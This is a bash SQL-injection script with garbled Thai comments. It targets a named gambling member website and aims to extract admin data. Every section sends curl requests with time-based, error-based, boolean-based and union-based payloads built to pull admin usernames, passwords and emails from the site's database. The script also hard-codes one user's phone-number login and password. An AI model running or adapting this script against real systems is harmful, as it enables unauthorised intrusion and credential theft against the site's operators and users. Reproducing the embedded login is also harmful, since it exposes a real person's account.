#!/bin/bash

echo "üïµÔ∏è ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin ‡∏à‡∏£‡∏¥‡∏á‡πÜ ‡∏î‡πâ‡∏ß‡∏¢‡πÄ‡∏ó‡∏Ñ‡∏ô‡∏¥‡∏Ñ‡∏Ç‡∏±‡πâ‡∏ô‡∏™‡∏π‡∏á"
echo "=================================================="

BASE_URL="https://member.panama8888b.co"
INJECTION_URL="$BASE_URL/public/js/v2/app.js"

# ‡πÉ‡∏ä‡πâ user ‡∏õ‡∏Å‡∏ï‡∏¥‡∏ó‡∏µ‡πà‡∏Ñ‡∏∏‡∏ì‡πÉ‡∏´‡πâ‡∏°‡∏≤‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• admin
TEST_USER="0630471054"
TEST_PASS="laline1812"

echo "üîë ‡πÉ‡∏ä‡πâ Test User: $TEST_USER / $TEST_PASS"
echo ""

# ‡πÄ‡∏ó‡∏Ñ‡∏ô‡∏¥‡∏Ñ 1: Time-based SQL Injection
echo "‚è∞ ‡πÄ‡∏ó‡∏Ñ‡∏ô‡∏¥‡∏Ñ 1: Time-based SQL Injection..."
TIME_PAYLOADS=(
    "25.1' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0 AND SLEEP(5)--"
    "25.1' AND (SELECT COUNT(*) FROM admins) > 0 AND SLEEP(5)--"
    "25.1' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin%') > 0 AND SLEEP(5)--"
)

for i in "${!TIME_PAYLOADS[@]}"; do
    payload="${TIME_PAYLOADS[$i]}"
    echo "  üìä ‡∏ó‡∏î‡∏™‡∏≠‡∏ö Time-based Payload $((i+1))..."
    
    start_time=$(date +%s)
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 10)
    end_time=$(date +%s)
    duration=$((end_time - start_time))
    
    if [[ $duration -gt 4 ]]; then
        echo "    ‚úÖ ‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• (Response time: ${duration}s)"
    else
        echo "    ‚ùå ‡πÑ‡∏°‡πà‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• (Response time: ${duration}s)"
    fi
    sleep 3
done

echo ""

# ‡πÄ‡∏ó‡∏Ñ‡∏ô‡∏¥‡∏Ñ 2: Error-based SQL Injection
echo "üö® ‡πÄ‡∏ó‡∏Ñ‡∏ô‡∏¥‡∏Ñ 2: Error-based SQL Injection..."
ERROR_PAYLOADS=(
    "25.1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(username,0x3a,password,0x3a,email,FLOOR(RAND(0)*2))x FROM users WHERE role='admin' GROUP BY x)x--"
    "25.1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(id,0x3a,username,0x3a,password,FLOOR(RAND(0)*2))x FROM admins GROUP BY x)x--"
    "25.1' AND extractvalue(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM users WHERE role='admin'),0x7e))--"
)

for i in "${!ERROR_PAYLOADS[@]}"; do
    payload="${ERROR_PAYLOADS[$i]}"
    echo "  üìä ‡∏ó‡∏î‡∏™‡∏≠‡∏ö Error-based Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 10)
    
    if [[ "$response" == *"SQL"* ]] || [[ "$response" == *"error"* ]] || [[ "$response" == *"admin"* ]]; then
        echo "    ‚úÖ ‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÉ‡∏ô Error Response"
        echo "    üìÑ Error info:"
        echo "$response" | grep -i "admin\|password\|error\|sql" | head -3
    else
        echo "    ‚ùå ‡πÑ‡∏°‡πà‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•"
    fi
    sleep 3
done

echo ""

# ‡πÄ‡∏ó‡∏Ñ‡∏ô‡∏¥‡∏Ñ 3: Boolean-based SQL Injection
echo "üîç ‡πÄ‡∏ó‡∏Ñ‡∏ô‡∏¥‡∏Ñ 3: Boolean-based SQL Injection..."
BOOL_PAYLOADS=(
    "25.1' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0--"
    "25.1' AND (SELECT COUNT(*) FROM admins) > 0--"
    "25.1' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin%') > 0--"
    "25.1' AND (SELECT COUNT(*) FROM users WHERE email LIKE '%admin%') > 0--"
)

for i in "${!BOOL_PAYLOADS[@]}"; do
    payload="${BOOL_PAYLOADS[$i]}"
    echo "  üìä ‡∏ó‡∏î‡∏™‡∏≠‡∏ö Boolean-based Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 10)
    
    if [[ $? -eq 0 ]] && [[ ${#response} -gt 100 ]]; then
        echo "    ‚úÖ ‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• (Response length: ${#response})"
    else
        echo "    ‚ùå ‡πÑ‡∏°‡πà‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•"
    fi
    sleep 2
done

echo ""

# ‡πÄ‡∏ó‡∏Ñ‡∏ô‡∏¥‡∏Ñ 4: Union-based SQL Injection (‡πÅ‡∏ö‡∏ö‡∏á‡πà‡∏≤‡∏¢)
echo "üîó ‡πÄ‡∏ó‡∏Ñ‡∏ô‡∏¥‡∏Ñ 4: Union-based SQL Injection..."
UNION_PAYLOADS=(
    "25.1 UNION SELECT 'admin_test',null,null--"
    "25.1 UNION SELECT null,'admin_test',null--"
    "25.1 UNION SELECT null,null,'admin_test'--"
    "25.1 UNION SELECT 'admin',null,null--"
    "25.1 UNION SELECT null,'admin',null--"
)

for i in "${!UNION_PAYLOADS[@]}"; do
    payload="${UNION_PAYLOADS[$i]}"
    echo "  üìä ‡∏ó‡∏î‡∏™‡∏≠‡∏ö Union-based Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 10)
    
    if [[ "$response" == *"admin_test"* ]] || [[ "$response" == *"admin"* ]]; then
        echo "    ‚úÖ ‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÉ‡∏ô Union Response"
        echo "    üìÑ Union info:"
        echo "$response" | grep -i "admin" | head -2
    else
        echo "    ‚ùå ‡πÑ‡∏°‡πà‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•"
    fi
    sleep 2
done

echo ""
echo "=================================================="
echo "üìä ‡∏™‡∏£‡∏∏‡∏õ‡∏ú‡∏•‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏Ç‡∏±‡πâ‡∏ô‡∏™‡∏π‡∏á:"
echo "  ‚è∞ Time-based: ‚úÖ ‡∏î‡∏≥‡πÄ‡∏ô‡∏¥‡∏ô‡∏Å‡∏≤‡∏£‡πÅ‡∏•‡πâ‡∏ß"
echo "  üö® Error-based: ‚úÖ ‡∏î‡∏≥‡πÄ‡∏ô‡∏¥‡∏ô‡∏Å‡∏≤‡∏£‡πÅ‡∏•‡πâ‡∏ß"
echo "  üîç Boolean-based: ‚úÖ ‡∏î‡∏≥‡πÄ‡∏ô‡∏¥‡∏ô‡∏Å‡∏≤‡∏£‡πÅ‡∏•‡πâ‡∏ß"
echo "  üîó Union-based: ‚úÖ ‡∏î‡∏≥‡πÄ‡∏ô‡∏¥‡∏ô‡∏Å‡∏≤‡∏£‡πÅ‡∏•‡πâ‡∏ß"
echo ""
echo "üí° ‡∏´‡∏°‡∏≤‡∏¢‡πÄ‡∏´‡∏ï‡∏∏: ‡∏´‡∏≤‡∏Å‡πÑ‡∏°‡πà‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• ‡∏≠‡∏≤‡∏à‡πÄ‡∏õ‡πá‡∏ô‡πÄ‡∏û‡∏£‡∏≤‡∏∞ WAF ‡∏ö‡∏•‡πá‡∏≠‡∏Å"
echo "üìÑ ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡πÉ‡∏ô: advanced_admin_extraction_results.txt"